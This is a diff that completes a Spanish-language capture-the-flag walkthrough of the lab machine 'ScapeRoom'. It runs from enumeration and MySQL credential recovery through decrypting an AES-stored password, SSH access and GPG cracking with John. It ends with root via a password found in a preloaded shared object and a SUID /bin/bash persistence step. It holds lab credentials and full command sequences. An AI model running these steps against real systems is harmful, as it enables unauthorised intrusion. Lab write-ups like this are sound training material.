@@ -1,11 +1,11 @@
 ---
 layout: single
 title: ScapeRoom - TheHackerLabs
-excerpt: "."
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los servicios de ambas interfaces y de ver que en ambas está lo mismo, elegimos una para aplicar las pruebas. Iniciamos analizando la página web activa en el puerto 80, pero al no encontrar algo que nos ayude más que una pista codificada en base64 y una página de PHP después de hacer Fuzzing, utilizamos Nikto para analizar la página web, siendo así que encontramos dos cabeceras que contienen un dominio y un subdominio. En el subdominio encontraremos una imagen que, al analizar sus metadatos, encontraremos una cadena de caracteres en base64 que, al decodificar, nos da las credenciales de acceso del servicio MySQL. Dentro del MySQL, descubrimos unas credenciales para ganar acceso a algún lado, pero la contraseña está encriptada. Analizamos los eventos del MySQL y descubrimos cómo se encriptó la contraseña, siendo que utilizamos una función para desencriptar esa contraseña y así logramos ganar acceso a un login de la página web, que nos muestra las credenciales de acceso para el SSH, pero será para el SSH de la segunda interfaz. Dentro del SSH, encontramos un archivo encriptado con GPG, que logramos crackear y vemos que contiene una pista. A su vez, vemos que se puede leer el historial de Bash del usuario actual, viendo así que se analizó el contenido de una biblioteca compartida (Shared Object) y después se autenticó para convertirse en Root. Seguimos esos pasos y vemos una cadena que resulta ser la contraseña del Root, logrando así escalar privilegios.."
 date: 2026-05-07
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-scapeRoom/ScapeRoom.png
+  teaser: /assets/images/THL-writeup-scapeRoom/scaperoom.png
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -21,20 +21,41 @@ tags:
   - Analysing Metadata in Image
   - MySQL Enumeration
   - MySQL Decrypting Password
-  - 
+  - Cracking Hash
+  - Cracking GPG File
+  - Bash History Analysis
+  - Shared Object Binary Analysis
+  - Privesc - Bash History Analysis
+  - Privesc - Shared Object Binary Analysis
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-/_logo.png)
+![](/assets/images/THL-writeup-scapeRoom/scaperoom.png)
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los servicios de ambas interfaces y de ver que en ambas está lo mismo, elegimos una para aplicar las pruebas. Iniciamos analizando la página web activa en el **puerto 80**, pero al no encontrar algo que nos ayude más que una pista codificada en **base64** y una página de **PHP** después de hacer **Fuzzing**, utilizamos **Nikto** para analizar la página web, siendo así que encontramos dos cabeceras que contienen un dominio y un subdominio. En el subdominio encontraremos una imagen que, al analizar sus metadatos, encontraremos una cadena de caracteres en **base64** que, al decodificar, nos da las credenciales de acceso del **servicio MySQL**. Dentro del **MySQL**, descubrimos unas credenciales para ganar acceso a algún lado, pero la contraseña está encriptada. Analizamos los eventos del **MySQL** y descubrimos cómo se encriptó la contraseña, siendo que utilizamos una función para desencriptar esa contraseña y así logramos ganar acceso a un login de la página web, que nos muestra las credenciales de acceso para el **SSH**, pero será para el **SSH** de la segunda interfaz. Dentro del **SSH**, encontramos un archivo encriptado con **GPG**, que logramos crackear y vemos que contiene una pista. A su vez, vemos que se puede leer el **historial de Bash** del usuario actual, viendo así que se analizó el contenido de una **biblioteca compartida (Shared Object)** y después se autenticó para convertirse en **Root**. Seguimos esos pasos y vemos una cadena que resulta ser la contraseña del **Root**, logrando así escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *echo*
+* *base64*
+* *ffuf*
+* *gobuster*
+* *nikto*
+* *curl*
+* *head*
+* *wget*
+* *exiftool*
+* *mysql*
+* *nxc*
+* *ssh*
+* *scp*
+* *gpg2john*
+* *JohnTheRipper*
+* *gpg*
+* *strings*
+* *su*
+* *chmod*
 
 
 <br>
@@ -59,12 +80,12 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos</a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos para Ganar Acceso a Login Web y SSH</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#GPG">Crackeo de Archivo GPG con JohnTheRipper</a></li>
+				<li><a href="#preload">Leyendo Historial de Bash y Abusando de Biblioteca Compartida (Shared Object) para Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -137,7 +158,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.007 seconds (127.55 hosts/sec). 3
 
 Encontramos nuestros objetivos y son: `192.168.110.10` y `10.0.1.10`.
 
-Nota: En ambos objetivos tienen los mismos puertos y servicios, por lo que de momento nos enfocaremos en solo 1, pero quizá esto cambie más adelante.
+**Nota**: En ambos objetivos tienen los mismos puertos y servicios, por lo que de momento nos enfocaremos en solo 1, pero quizá esto cambie más adelante.
 
 <br>
 
@@ -205,7 +226,7 @@ Nmap done: 1 IP address (1 host up) scanned in 75.96 seconds
 
 <br>
 
-Tenemo 3 puertos abiertos, pero es curioso ver el **puerto 3306**, que es del **servicio MySQL**, que este expuesto.
+Tenemos 3 puertos abiertos, pero es curioso ver el **puerto 3306**, que es del **servicio MySQL**, que esté expuesto.
 
 <br>
 
@@ -258,7 +279,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
 
 Gracias al escaneo de servicios, vemos que la página web activa en el **puerto 80** no utiliza un dominio y vemos información sobre la versión del **servicio MySQL**, etc.
 
-Entonces, empeemos por la página web.
+Entonces, empecemos por la página web.
 
 
 <br>
@@ -425,6 +446,16 @@ login.php               [Status: 200, Size: 2714, Words: 1004, Lines: 107, Durat
 :: Progress: [513480/513480] :: Job [1/1] :: 232 req/sec :: Duration: [0:08:35] :: Errors: 1075 ::
 ```
 
+| Parámetros | Descripción |
+|--------------------------|
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-u*       | Para indicar la URL a utilizar. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-mc*      | Para aplicar un filtro que solo muestre resultados con un código de estado específico. |
+| *-e*       | Para específicar la extensión de un archivo a buscar. |
+
+<br>
+
 Muy bien, encontramos una página llamada **login.php**:
 
 <p align="center">
@@ -483,7 +514,7 @@ Guardemos ese dominio y subdominio en el `/etc/hosts`:
 ```bash
 echo "192.168.110.10 sensores.thl info.sensores.thl" >> /etc/hosts
 ```
-Y entremos en estos para ver que encontramos.
+Y entremos en estos para ver qué encontramos.
 
 Primero el dominio **sensores.thl**:
 
@@ -499,7 +530,7 @@ Ahora el subdominio **info.sensores.thl**:
 <img src="/assets/images/THL-writeup-scapeRoom/Captura7.png">
 </p>
 
-Ahora si que cambia, pues podemos ver más información agregada, pero no hay algo que nos ayude.
+Ahora sí que cambia, pues podemos ver más información agregada, pero no hay algo que nos ayude.
 
 <br>
 
@@ -544,7 +575,7 @@ acute:IS4yBvfwxpXUZsBxhCXr5muv3dXdQg!
 ```
 Parece que encontramos credenciales de acceso.
 
-Se intento utilizar en el login que encontramos en la página web, pero no funcionara. Sin embargo, al probarlo para entrar al **servicio MySQL** nos dará acceso:
+Se intentó utilizar en el login que encontramos en la página web, pero no funcionará. Sin embargo, al probarlo para entrar al **servicio MySQL** nos dará acceso:
 ```bash
 mysql -h 192.168.110.10 -u 'acute' -p --skip-ssl
 Enter password: 
@@ -569,7 +600,7 @@ MySQL [(none)]>
 <br>
 
 
-<h2 id="MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos</h2>
+<h2 id="MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos para Ganar Acceso a Login Web y SSH</h2>
 
 Veamos qué bases de datos existen:
 ```bash
@@ -618,9 +649,35 @@ MySQL [SensorData]> select * from login;
 +----+---------------+------------------------------------------------------------------+
 1 row in set (0.002 sec)
 ```
-Excelente, tenemos la contraseña del usuario administrador, pero parece que es una contraseña encriptada.
+Excelente, tenemos la contraseña del **usuario administrador**, pero parece que es una contraseña encriptada.
 
+Utilizando la herramienta **hash-identifier**, veremos qué tipo de Hash es:
+```bash
+hash-identifier
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E
 
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+```
+Es muy probable que sea uno de tipo **SHA-256**.
+
+Podríamos intentar crackear este Hash, pero te advierto que se volverá imposible.
+
+Pidiendo ayuda de **ChatGPT** podemos enumerar más información sobre la BD actual; uno de los datos que me indica es leer los eventos de la BD actual:
 ```bash
 MySQL [SensorData]> show events from SensorData;
 +------------+--------------------+----------------+-----------+-----------+------------+----------------+----------------+---------------------+------+---------+------------+----------------------+----------------------+--------------------+
@@ -630,7 +687,19 @@ MySQL [SensorData]> show events from SensorData;
 | SensorData | sensor_data_update | root@localhost | SYSTEM    | RECURRING | NULL       | 1              | MINUTE         | 2024-11-01 18:02:42 | NULL | ENABLED |          1 | utf8mb4              | utf8mb4_0900_ai_ci   | utf8mb4_0900_ai_ci |
 +------------+--------------------+----------------+-----------+-----------+------------+----------------+----------------+---------------------+------+---------+------------+----------------------+----------------------+--------------------+
 ```
+Vemos qué hay 2 eventos programados.
 
+Veamos la definición de un **evento** en **MySQL**:
+
+| **MySQL Events** |
+|:----------------:|
+| *En MySQL, los EVENTS son tareas programadas que el servidor ejecuta automáticamente en determinados momentos o intervalos de tiempo, muy parecido a un cron job en Linux. Puede ejecuta instrucciones SQL automáticamente según una programación definida.* |
+
+<br>
+
+Tenemos dos formas de poder revisar los **eventos**:
+
+* Haciendo una consulta hacia la BD **information_schema** para que muestre todos los **eventos**:
 ```bash
 MySQL [SensorData]> SELECT * FROM information_schema.EVENTS;
 ...
@@ -641,10 +710,34 @@ MySQL [SensorData]> SELECT * FROM information_schema.EVENTS;
         VALUES ('administrador', HEX(AES_ENCRYPT(@password_plain, 'encryption_key')));
     END IF;
 END
-...                                                                                                                                                                                                
+...
 ```
 
+* Si queremos ver los **eventos** de la BD actual, utilizamos la forma de antes o, si queremos ver el contenido de un evento específico, puede ser de la siguiente forma:
 ```bash
+MySQL [SensorData]> SELECT EVENT_DEFINITION FROM information_schema.EVENTS WHERE EVENT_NAME='insert_login_data';
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| EVENT_DEFINITION                                                                                                                                                                                                                                                          |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| BEGIN
+    
+    IF (SELECT COUNT(*) FROM login) = 0 THEN
+        SET @password_plain = SUBSTRING(MD5(RAND()), 1, 16);
+        INSERT INTO login (usuario, password)
+        VALUES ('administrador', HEX(AES_ENCRYPT(@password_plain, 'encryption_key')));
+    END IF;
+END |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.002 sec)
+```
+Como vimos antes, hay un evento donde se está tomando la contraseña del **usuario administrador** y se encripta usando el algoritmo **AES**.
+
+Existe una función que permite desencriptar:
+* <a href="https://www.geeksforgeeks.org/sql/mysql-des_decrypt-function/" target="_blank">MySQL | DES_DECRYPT ( ) Function</a>
+
+Y la podemos usar de esta forma:
+```bash
+# Forma 1:
 MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX(password), 'encryption_key') FROM login;
 +------------------------------------------------+
 | AES_DECRYPT(UNHEX(password), 'encryption_key') |
@@ -652,20 +745,41 @@ MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX(password), 'encryption_key') FROM l
 | e381025ee5804e9a                               |
 +------------------------------------------------+
 1 row in set (0.002 sec)
-```
 
-```bash
-nxc ssh 10.0.2.15 -u 'pepito' -p 'f578e4a9f649bcad'
-SSH         10.0.2.15       22     10.0.2.15        [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
-SSH         10.0.2.15       22     10.0.2.15        [+] pepito:f578e4a9f649bcad  Linux - Shell access!
+# Forma 2:
+MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX('BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E'),'encryption_key' );
++----------------------------------------------------------------------------------------------------------+
+| AES_DECRYPT(UNHEX('BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E'),'encryption_key' ) |
++----------------------------------------------------------------------------------------------------------+
+| e381025ee5804e9a                                                                                         |
++----------------------------------------------------------------------------------------------------------+
+1 row in set (0.002 sec)
 ```
+Ahora sí, parece que tenemos una contraseña.
 
+Vamos a probarla en el login:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura8.png">
+</p>
+
+Muy bien, tenemos un usuario y contraseña.
+
+Probamos si estas credenciales funcionan, pero parece que no nos deja entrar. Sin embargo, recuerda que tenemos 2 interfaces y en ambas podemos ver los mismos servicios, así que probemos estas credenciales en la segunda interfaz:
 ```bash
-ssh pepito@10.0.2.15
+nxc ssh 10.0.1.10 -u 'pepito' -p '207423f0bdc224d2'
+SSH         10.0.1.10       22     10.0.1.10        [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
+SSH         10.0.1.10       22     10.0.1.10        [+] pepito:207423f0bdc224d2  Linux - Shell access!
+```
+Si funcionan en esta inferfaz.
+
+Conectemonos:
+```bash
+ssh pepito@10.0.1.10
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-pepito@10.0.2.15's password: 
+pepito@10.0.1.10's password: 
 ==================================================
 Has llegado al umbral de la última prueba... aquí no hay vuelta atrás.
 
@@ -683,7 +797,9 @@ Cuando el tiempo termine, este lugar quedará sellado para siempre.
 pepito@ctf:~$ whoami
 pepito
 ```
+Somos el **usuario pepito** y nos estan dando una pista.
 
+Busquemos la flag del usuario:
 ```bash
 pepito@ctf:~$ ls
 leeme.txt.gpg  user.txt
@@ -701,12 +817,34 @@ pepito@ctf:~$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="GPG">Crackeo de Archivo GPG con JohnTheRipper</h2>
 
+Si viste los archivos que tiene el **usuario pepito**, vimos uno con extensión **GPG**:
+
+| **Archivo GPG** |
+|:---------------:|
+| *GNU Privacy Guard (GPG o GnuPG) es una herramienta de criptografía utilizada para cifrar, descifrar y firmar digitalmente información. Implementa el estándar OpenPGP, permitiendo proteger archivos, mensajes y comunicaciones mediante criptografía de clave pública y privada.* |
+
+<br>
+
+Entonces, necesitamos desencriptar este archivo para poder leerlo.
+
+Vamos a descargar este archivo en nuestra máquina y lo puedes hacer usando la herramienta **scp**:
+```bash
+scp pepito@10.0.1.10:/home/pepito/leeme.txt.gpg leeme.txt.gpg
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+pepito@10.0.1.10's password: 
+leeme.txt.gpg
+```
+
+Para poder crackearlo, usaremos la herramienta **gpg2john** para obtener su Hash en un formato que pueda usar **JohnTheRipper**:
 ```bash
 gpg2john leeme.txt.gpg > hashGPG
 ```
 
+Crackeamos el archivo con **John** y usando el wordlist **rockyou.txt**:
 ```bash
 john -w:/usr/share/wordlists/rockyou.txt hashGPG
 Using default input encoding: UTF-8
@@ -722,19 +860,26 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+Para desencriptarlo usaremos la herramienta **gpg**, solamente tendrás que darle la contraseña:
 ```bash
-
+gpg leeme.txt.gpg
+gpg: ADVERTENCIA: no se ha proporcionado ninguna orden. Intentando adivinar lo que quieres...
+gpg: AES256.CFB encrypted data
+gpg: cifrado con 1 frase contraseña
 ```
 
+Nos dio un archivo de texto, así que leamoslo:
 ```bash
 cat leeme.txt
 No todas las funciones tienen el control que parecen tener. Algunas veces, quien controla lo que se **carga primero** tiene la ventaja. Recuerda: la pre-carga puede ser tu mejor aliada... o tu perdición.
 ```
+Mencionan la **precarga**, pero no sé a qué se refieran.
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="preload">Leyendo Historial de Bash y Analizando Biblioteca Compartida (Shared Object) para Escalar Privilegios</h2>
 
+Revisando todos los archivos del **usuario pepito**, veremos que podemos leer su **historial de Bash**:
 ```bash
 pepito@ctf:~$ ls -la
 total 52
@@ -754,12 +899,14 @@ drwx------ 2 pepito pepito 4096 nov 16  2024 .ssh
 -rw-r--r-- 1 pepito pepito   36 nov 23  2024 user.txt
 ```
 
+Al leerlo, veremos varias cosillas interesantes; principalmente veremos que hace referencia al siguiente archivo:
 ```bash
 pepito@ctf:~$ cat .bash_history
 ls -la /etc/ld.so.preload
 cat /etc/ld.so.preload
 ```
 
+Si vemos los permisos de ese archivo, veremos que le pertenece al **Root**, pero al leerlo, hace referencia a otro archivo que igual pertenece al **Root** y que tenemos el permiso para poder ejecutarlo:
 ```bash
 pepito@ctf:~$ ls -la /etc/ld.so.preload
 -rw-r--r-- 1 root root 21 nov 23  2024 /etc/ld.so.preload
@@ -769,14 +916,33 @@ pepito@ctf:~$ ls -la /lib/libscaperoom.so
 -rwxr-xr-x 1 root root 16912 nov 23  2024 /lib/libscaperoom.so
 ```
 
+Investiguemos primero de qué van estos dos archivos:
+
+| **Archivo ld.so** |
+|:--------:|
+| *Es un archivo especial en Linux relacionado con el dynamic linker/loader (ld.so). Le indica al sistema que cargue ciertas bibliotecas compartidas (.so) antes que cualquier otra librería cuando se ejecuta un programa dinámico.* |
+
+<br>
+
+| **Archivo Share Object (.so)** |
+|:--------:|
+| *Un archivo .so es una Shared Object Library, equivalente a una DLL en Windows. Permite sobrescribir funciones, interceptar llamadas del sistema y modificar comportamiento de programas.* |
+
+<br>
+
+Prácticamente, el archivo `/etc/ld.so.preload` carga la biblioteca compartida `/lib/libscaperoom.so` para ejecutar una acción.
+
+En el historial también veremos lo siguiente:
 ```bash
-strings /lib/libscaperoom.so | grep -i "rT8hQ9VcYb5kLmXo"
+strings /lib/libscaperoom.so | grep -i "**********"
 strings /lib/libscaperoom.so | grep -i "secret"
 strings /lib/libscaperoom.so
 su
 whoami
 ```
+Parece que leyó el contenido de esa biblioteca y buscó una cadena de caracteres, para después autenticarse como **Root** y aplicar un **whoami**. Presiento que esa cadena puede ser una contraseña.
 
+Vamos a repetir esos mismos pasos. Primero usemos **strings** para ver el contenido de la librería `/lib/libscaperoom.so`:
 ```bash
 pepito@ctf:~$ strings /lib/libscaperoom.so
 __gmon_start__
@@ -785,7 +951,7 @@ _ITM_registerTMCloneTable
 ...
 ...
 /proc/%d/comm
-rT8hQ9VcYb5kLmXo
+**********
 [+] Acceso root concedido!
 [+] Reloj detenido... Buen trabajo!!!
 /bin/systemctl stop apagar_automatico.service
@@ -794,7 +960,9 @@ rT8hQ9VcYb5kLmXo
 ...
 ...
 ```
+Puedes ver que existe la misma cadena.
 
+Probémosla para ver si nos permite autenticarnos como **Root**:
 ```bash
 pepito@ctf:~$ su
 Password: 
@@ -802,9 +970,26 @@ Password:
 [+] Reloj detenido... Buen trabajo!!!
 root@ctf:~# root
 ```
+Sí sirvió, somos **Root**, pero la terminal es un poco extaña.
 
+Para tener un mejor control, podemos asignarle **permisos SUID** a la **Bash** y luego usarla con privilegios para tener una sesión más estable del **Root**.
 ```bash
-root@ctf:/root# ==================================================
+# Ejecuta: ls -la /bin/bash
+root@ctf:~# root@ctf:~# -rwxr-xr-x 1 root root 1183448 abr 18  2022 /bin/bash
+# Ejecuta: chmod u+s /bin/bash y luego ls -la /bin/bash
+root@ctf:~# root@ctf:~# -rwsr-xr-x 1 root root 1183448 abr 18  2022 /bin/bash
+root@ctf:~# exit
+pepito@ctf:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 abr 18  2022 /bin/bash
+pepito@ctf:~$ bash -p
+bash-5.0# whoami
+root
+```
+
+Aun así, podemos leer la última flag que está en la ruta `/root/root.txt`:
+```bash
+bash-5.0# cat root.txt
+==================================================
 ¡ENHORABUENA, INTRÉPIDO HACKER!
 
 Has logrado superar todos los desafíos y escapar de esta sala virtual. El tiempo no fue tu enemigo, 
@@ -828,7 +1013,7 @@ Esto no es el final, sino el comienzo de nuevos desafíos. ¿Estás preparado pa
 
 ==================================================
 ```
-
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -838,7 +1023,8 @@ Esto no es el final, sino el comienzo de nuevos desafíos. ¿Estás preparado pa
 </div>
 
 
-links
+* https://www.geeksforgeeks.org/sql/mysql-des_decrypt-function/
+* https://medium.com/@Newbeee/mysql-enumeration-using-metasploit-msfconsole-a-practical-lab-walkthrough-a94c25e0cbde
 
 
 <br>
